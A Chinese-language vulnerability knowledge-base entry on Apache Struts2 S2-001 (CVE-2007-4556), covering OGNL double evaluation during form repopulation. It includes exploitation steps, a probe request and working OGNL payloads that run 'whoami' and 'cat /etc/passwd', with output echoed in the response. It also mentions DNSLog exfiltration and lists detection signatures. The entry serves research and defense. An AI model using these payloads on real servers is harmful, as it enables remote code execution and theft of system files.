---
id: web-java-framework-struts2-s2-001-form-repopulate-ognl-rce
title: Struts2 S2-001 表单回填二次 OGNL 解析：%{...} 提交值在 UIBean 渲染时被再次求值导致 RCE
type: scenario
domain: web
path: web/java/framework/struts2
technique: struts2-altSyntax-double-ognl-evaluation
tags:
- java
- struts2
- ognl
- expression-injection
- rce
- doubles-evaluation
- altsyntax
cve:
- CVE-2007-4556
severity: critical
confidence: high
affected_versions: Struts 2.0.0 - 2.0.8
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-18
  verified_at: '2026-11-08T09:06:13+08:00'
  notes: 已对照原文与29张截图核对：原文标题「影响版本 Struts 2.0.0 - 2.0.8」「漏洞编号 CVE-2007-4556」明确给出，affected_versions 与之一致无需改动；img03 提交 %{1111*11} 回填得到 12221，img04 value=tomcatBinDir{/usr/local/tomcat}，img05 回显 /usr/local/tomcat/webapps/ROOT/，证明 OGNL 求值与静态方法调用成立；img24 确认 altSyntax 下 expr="%{"+expr+"}" 再 findValue，img25 确认 findValue 走 TextParseUtil.translateVariables(xwork-2.0.3)，img29 确认 while(true) 与 img28 的 expression=left+o+right 重组，二次解析链完整。未验证点：img06 的 ProcessBuilder 请求响应体未见 whoami 回显，命令执行结果仅由代码层与静态方法回显间接佐证，不影响 critical/high 判定。
url: /docs/web/java/framework/struts2/web-java-framework-struts2-s2-001-form-repopulate-ognl-rce/
draft: false
kb_aliases:
- S2-001
- CVE-2007-4556
- Struts2 表单回填 OGNL 注入
- altSyntax 二次解析
- UIBean evaluateParams RCE
- Struts2 2.0.8 RCE
---

## 一句话结论

Struts2 在表单校验失败回填时会用 `%{value}` 重新解析用户提交的字段值，而 `altSyntax` 默认开启使 `UIBean.end() → evaluateParams() → findValue() → TextParseUtil.translateVariables()` 把该值当作 OGNL 表达式求值，且求值发生在 `while` 循环里，于是提交 `%{...}` 会被反复解析并最终执行，等于把输入直接变成代码。

## 原理

S2-001 的成因是“回显 + 二次求值”，不是某个参数被显式拼进 OGNL：

1. 用户提交登录/注册表单，`LoginAction.execute()` 校验失败返回 `error`，Result 指回 `index.jsp`；
2. `index.jsp` 用 `<s:textfield name="username"/>` 渲染输入框。Struts2 标签会把 Action 中同名字段的值作为默认值回填，即 `value="%{username}"`；
3. `ComponentTagSupport.doEndTag()` → `UIBean.end()` → `evaluateParams()`：由于 `altSyntax` 默认开启，参数值里的 `%{...}` 会被 `findValue()` 当作表达式；
4. `findValue()` 调用 `TextParseUtil.translateVariables()`，用正则提取 `%{` `}` 之间的内容交给 `OgnlUtil.getValue()` 求值；
5. 关键点在于 `translateVariables` 是 `while` 循环：每轮求值结果会被重新拼回字符串再次匹配 `%{}`。攻击者提交 `%{7*7}`，第一轮得 `49`，若结果本身仍形如表达式则继续解析；攻击者构造的 payload 在解析后产生新的表达式片段，就会被逐层执行，最终落到任意方法调用。

也就是说，漏洞的必要条件是“用户可控值被当作模板字符串交给二次解析”，表单回填只是最常见的触发场景；`altSyntax` 开关与 `while` 循环构成了“输入即代码”的机制。

## 触发条件

- Struts2 版本 2.0.0 – 2.0.8（`xwork` 2.0.x，`altSyntax` 默认开启，`translateVariables` 无递归次数限制）；
- 页面用 `<s:textfield>`/`<s:property>` 等标签回填用户可控字段（校验失败重新渲染是典型入口）；
- 攻击者能提交表单参数（GET/POST 均可，字段名与 Action 属性对应）；
- 目标未部署任何 OGNL 沙箱（该版本尚无 `excludedPackageNames` 等限制）。

## 利用步骤

1. 找到有回填行为的表单页（登录失败、注册校验失败最常见），确认提交的参数名；
2. 探测：提交 `%{1111*11}`，页面回填处出现 `12221` 即存在表达式求值；
3. 探测当前目录：`%{"tomcatBinDir{"+@java.lang.System@getProperty("user.dir")+"}"}`；
4. 取 Web 根目录：`#req=@org.apache.struts2.ServletActionContext@getRequest(), #response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(), #response.println(#req.getRealPath('/'))`；
5. 执行命令：用 `ProcessBuilder` 起进程，读 `getInputStream()`，经 `InputStreamReader`/`BufferedReader` 读入 `char[]`，再通过 `#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter()` 回显；
6. 无回显时改用 `java.lang.Thread.sleep(5000)` 做时间盲测，或用 DNSLog 外带。

## PoC

探测：

```http
POST /login.action HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

username=%{1111*11}&password=x
```

回填位置返回 `12221` 即命中。

命令执行（回显型最小 payload）：

```java
%{
#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"whoami"})).redirectErrorStream(true).start(),
#b=#a.getInputStream(),
#c=new java.io.InputStreamReader(#b),
#d=new java.io.BufferedReader(#c),
#e=new char[50000],
#d.read(#e),
#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),
#f.getWriter().println(new java.lang.String(#e)),
#f.getWriter().flush(),
#f.getWriter().close()
}
```

老版本通用写法（配合静态方法访问开关）：

```java
a=${#_memberAccess["allowStaticMethodAccess"]=true,
#a=@java.lang.Runtime@getRuntime().exec('cat /etc/passwd').getInputStream(),
#b=new java.io.InputStreamReader(#a),
#c=new java.io.BufferedReader(#b),
#d=new char[50000],
#c.read(#d),
#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),
#out.println('result=' + new java.lang.String(#d)),
#out.close()}
```

## 变体与关联

- 触发面变体：任何被标签二次解析的用户值都可作为入口，不限于 `<s:textfield>`；`<s:property value="%{...}">`、国际化资源、`<s:url>` 参数同理；
- 传输变体：GET 路径与 POST 表单等价；payload 放在参数名（`username[%{...}]`）或文件名（multipart 的 `filename=`）也能进入 OGNL 求值，对应后续的 S2-066/S2-067 系列；
- 绕过变体：该版本无沙箱，2.0.9 之后才逐步引入 `allowStaticMethodAccess`、`xwork.MethodAccessor.denyMethodExecution`、`excludedPackageNames` 等，届时需要 `#_memberAccess` 改写、反射改私有字段等手法；
- 修复变体：`xwork 2.0.4` 增加 `maxLoopCount` 限制递归解析次数，属于“打断 while 循环”的补丁思路，而非禁用表达式；
- 关联：[[web-java-framework-struts2-actionproxy-ognl-injection]]（URL 组成进入 `OgnlUtil.compileAndExecute`，S2-032/033/037/057 同源）、[[web-java-framework-struts2-s2-016-legacy-version-ognl-rce]]（重定向参数二次解析）。

## 检测与防御

- 升级：Struts2 ≥ 2.0.9（或直接迁移到受支持版本），确认 `xwork` 同步升级；
- 配置：关闭 `struts.enable.DynamicMethodInvocation`、显式设置 `struts.ui.templateDir` 与 `altSyntax` 策略，不从请求值回填标签参数；
- 输出侧：回填时对用户值做 HTML 编码并禁止 `%{}` 语法（`<s:property escapeHtml="true">` 等），避免“值即模板”；
- 检测：请求参数中出现 `%{`、`@java.lang.Runtime@`、`ProcessBuilder`、`getRuntime().exec`、`ServletActionContext`、`#_memberAccess` 等特征；回填页面对 `%{数字*数字}` 返回乘积即视为命中；
- 运行层：Java 安全管理器/容器沙箱限制进程创建与反射，WAF 拦截 OGNL 关键字组合（仅作补充，不能替代升级）。
